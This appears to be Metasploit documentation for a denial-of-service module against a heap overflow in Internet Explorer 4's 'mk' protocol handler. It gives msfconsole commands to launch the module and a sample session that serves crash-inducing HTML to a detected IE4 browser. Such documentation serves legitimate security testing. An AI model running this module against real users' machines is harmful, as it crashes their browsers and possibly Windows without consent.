## Vulnerable Application

This module exploits a vulnerability found in Microsoft Internet Explorer 4 and
4.01 on Windows 95 OSR1, OSR2, and NT Workstation/Server.

A heap based buffer overflow in the handling of the 'mk' protocol can lead to remote
code execution.  However, due to the age of the vulnerability, and the relatively
rigid offset requirements based on IE version, the bug is simply put as a DoS as
no one should be using IE4 in 2020+.

This DoS will also crash the Active Desktop, and potentially Windows itself.

## Verification Steps

1. Start msfconsole
1. Do: `use auxiliary/dos/browser/ie_mk_handler_dos`
1. Do: `run`
1. Do: Browse to the URL with IE4
1. IE4/4.01 (and the Active Desktop) will crash.  Windows may also crash

## Options

## Scenarios

### IE 4.01 on Windows 95

```
msf5 > use auxiliary/dos/browser/ie_mk_handler_dos
msf5 auxiliary(dos/browser/ie_mk_handler_dos) > run
[*] Auxiliary module running as background job 0.
msf5 auxiliary(dos/browser/ie_mk_handler_dos) > 
[*] Using URL: http://0.0.0.0:8080/v4o58g7d4IJX
[*] Local IP: http://192.168.2.199:8080/v4o58g7d4IJX
[*] Server started.
[+] Vulnerable IE detected: Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)
[*] Sending HTML...
```
